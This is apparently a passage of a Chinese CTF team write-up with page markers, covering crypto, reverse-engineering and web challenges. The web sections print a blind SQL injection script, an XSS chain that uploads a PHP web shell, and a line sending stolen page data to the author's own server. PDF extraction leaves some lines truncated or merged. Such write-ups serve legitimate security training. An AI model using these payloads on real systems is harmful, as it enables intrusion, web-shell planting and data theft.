    print "key:{%s}"%key
    print "seed:{%s}"%seed
    while True:
        yield key
        key = process(key, seed)
def str2num(s):
    return int(s.encode('hex'), 16)
P = 0x10000000000000000000000000000000000000000000000000000000000000425L
true_secret = ""
fake_secret1 = "I_am_not_a_secret_so_you_know_me"
fake_secret2 = "feeddeadbeefcafefeeddeadbeefcafe"
true_secret_key = 0
fake_secret1_key = 0x2a51d5b1bd1abdee4999363397902036332916fbce0982ebd3f5ece8e3ea395
9
fake_secret2_key = 0x8f76be63af819557a5a88fca37f631b750348eb8ab0cb69fbdb0b94e4a522b7
eL
ctx1 = 0xaf3fcc28377e7e983355096fd4f635856df82bbab61d2c50892d9ee5d913a07f
ctx2 = 0x630eb4dce274d29a16f86940f2f35253477665949170ed9e8c9e828794b5543c
ctx3 = 0xe913db07cbe4f433c7cdeaac549757d23651ebdccf69d7fbdfd5dc2829334d1b
seed = 0
for i in xrange(255):
    fake_secret2_key = process(fake_secret2_key,fake_secret1_key)
seed = fake_secret2_key
print "seed:{%s}"%hex(seed)[:-1]
for i in xrange(255):
    fake_secret1_key = process(fake_secret1_key, seed)
true_secret_key = fake_secret1_key
print "true_secret_key:{%s}"%hex(true_secret_key)[:-1]
print "flag:{flag{%s}}"%hex(true_secret_key ^ ctx1)[2:-1].decode('hex')
Re
13/22
choices
lib0opsPass.so是一个基于 ollvm 那套东西做的一个clang 插件，功能是将控制流平坦
化，同时通过密码控制平摊化后的控制流的执行顺序，从而起到加密的作用。
主要的函数是Oops::OopsFlattening::flatten,通过分析该函数，可以得知switch的
case 是由scramble32生成的，参数是代码里通过 label 指定的。scramble32还使用了
oopsSeed的值。
在oopsSeed已知的情况下只要枚举label后面跟着的数字值，就可以获得所有的 case
的先后顺序。
由于lib0opsPass.so导入了 toobfuscate 这个函数（虽然并没有启用 ollvm 的功
能），所以必须给原来的clang3.9.1加上ollvm的lib/Transforms/Obfuscation/ 中的内
容。
在 test.cpp 中写满
这样的代码片段，枚举数字
通过 clang -Xclang -load -Xclang lib0opsPass.so -mllvm -
oopsSeed=BAADF00DCAFEBABE3043544620170318 source.c 命令行编译
通过分析编译得到的程序中 case值 和数字的对应关系得到原程序的执行顺序。最终得
到 flag flag{wHy_d1D_you_Gen3R47e_cas3_c0nst_v4lUE_in_7h15_way?}
engineTest
程序是个 vm
有四种 opcode
分别是 and 1 or 2 xor 3 if 4
整个 vm 程序不存在任何跳转，控制流只有一条
因此 dump 出整个程序，借助脚本转化为 z3 程序，求解即可得到结果
最后有个小坑，是 flag 在 vm 的内存中保存方式是和正常情况相反的，要稍加处理。
转换脚本:
Label数字:
printf("数字");
Re
14/22
Web:
simplesqlin
特殊过滤，总之%00会被去掉，貌似出题人是考察框架过滤问题然后bypass。
Temmo’s Tiny Shop
Like注入，过滤了很多东西，就剩逗号括号了，不过也够用了：
脚本：
ip = ['0000000000000110', '0000000000000002', '0000000000000003', ……]  # 后面省略
op = ['0000000000000040', '00000000000087e9', '00000000000087ea', ……]
data4 = ['00000000000000d4', '0000000000004090', '0000000000004091', ……]
data3 = ['0000000000000002', '0000000000000000', '0000000000000000', ……]
data2 = ['0000000000000003', '0000000000000000', '0000000000000002', ……]
f = open('output.py', 'wb')
for i, v in enumerate(data4):
    opcode = int(data2[n * 5], 16)
    arg1 = int(data2[n * 5 + 1], 16)
    arg2 = int(data2[n * 5 + 2], 16)
    arg3 = int(data2[n * 5 + 3], 16)
    dest = int(data2[n * 5 + 4], 16)
    output_line = ''
    if opcode == 2:
        output_line = 'b[%d] = Or(b[%d], b[%d])' % (dest, arg1, arg2)
    elif opcode == 3:
        output_line = 'b[%d] = Xor(b[%d], b[%d])' % (dest, arg1, arg2)
    elif opcode == 1:
        if arg1 == 0 or arg2 == 0:
            output_line = 'b[%d] = False' % (dest)
        elif arg1 == 1 or arg2 == 1:
            output_line = 'b[%d] = b[%d]' % (dest, arg1 if arg2 == 1 else arg2)
        else:
            output_line = 'b[%d] = And(b[%d], b[%d])' % (dest, arg1, arg2)
    elif opcode == 4:
        if arg2 == arg3 or arg1 == 1:
            output_line = 'b[%d] = b[%d]' % (dest, arg2)
        elif arg1 == 0:
            output_line = 'b[%d] = b[%d]' % (dest, arg3)
        else:
            output_line = 'b[%d] = If(b[%d], b[%d], b[%d])' % (
                dest, arg1, arg2, arg3)
    else:
        print('wrong')
        print(i)
    f.write(output_line + '\n')
f.close()
Web:
15/22
有长度限制，单词换成%_接着跑就OK。也可以通过substr。
KOG
题目是一个很明显的js，是一个js的llvm，实现了一个特别复杂的验证，我们在
functionn.js中可以发现所有的检验应该都是在这个函数之中的。我们根据正常的思
路，首先是发现如果输入注入语句，不返回hash，所以猜测是 if(存在注入)return 这种形
式，全部的js一共13个return，4个带if判断，一个一个的测试吧 if(xxxx) 改成 if(0) ,这
种形式，发现
在 __Z10user_inputNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE 这个
函数之中，存在的两个 if--return 都hook之后，可以正常返回hash。
1490411456404
# -*- coding:utf-8 -*- 
import requests
import re
dic="abcdefghijklmnopqrstuvwxyz0123456789{}_"
flag=''
flagis=''
for i in range(1,100):
    for j in dic:
        flag1=j.encode('hex')
        cook={"PHPSESSID":"2pkk8otq21s1t2lru6q941vh32"}
        url="http://202.120.7.197/app.php?action=search&keyword=&order=if((select((f
lag))from(ce63e444b0d049e9c899c9a0336b3c59))like(0x"+flag+flag1+"25),name,price)"
        b=requests.get(url=url,cookies=cook)
        if "price" in b.text:
            num1=b.text.split("price\":\"")[1].split("\"")[0]
            num2=b.text.split("price\":\"")[2].split("\"")[0]
            if int(num2)  不能成对出现，其他发现可用字符特别少，然后测试发现 \ 没
有过滤，于是想到可以找一个不需要成对出现  ,之后直接利用jquery访问就可以拿到flag了
Web:
17/22
1490412706753
Web:
18/22
1490413645171
Web:
19/22
最终payload:  的标签link
- 找一个https网站
complicated xss
http://government.vip/
先上payload
function setCookie(name, value, seconds) {
 seconds = seconds || 0; //seconds有值就直接赋值，没有为0，这个根php不一样。
 var expires = "";
 if (seconds != 0 ) { //设置cookie生存时间
 var date = new Date();
 date.setTime(date.getTime()+(seconds*1000));
 expires = "; expires="+date.toGMTString();
 }
 document.cookie = name+"="+value+expires+"; path=/;domain=government.vip"; //转码并
赋值
}
setCookie('username','',1000)
var ifm=document.createElement('iframe');ifm.src='http://admin.government.vip:8000/'
;document.body.appendChild(ifm);
Web:
20/22
随便登陆一个test，查看源码发现删了很多东西
1490413874956
思路就是根域名触发xss，然后给所有域种上cookie，cookie的username字段会输出
在admin域那个页面，这样就能在admin域执行XSS了，读到html发现表单就是
var xhr = new XMLHttpRequest();xhr.open("POST", "http://admin.government.vip:8000/up
load", true);
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebK
itFormBoundaryrGKCBY7qhFd3TrwA");
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/
xml;q=0.9,image/webp,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundaryrGKCBY7qhFd3TrwA\r\n" +
          "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n
" + 
          "Content-Type: image/png\r\n" + 
          "\r\n" + 
          "GIF89a\x3c?php eval($_POST[albert]);?\x3e\x3c/script\x3e\r\n" +
          "------WebKitFormBoundaryrGKCBY7qhFd3TrwA--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i Upload your shell
Web:
21/22
，所以在admin域构造个文件上传，然后拿到他的返回值，并通过`new Image().src
="http://xss.albertchang.cn/?data="+escape(evt.target.responseText);`这样的方式
发到自己的vps就好了
Web:
22/22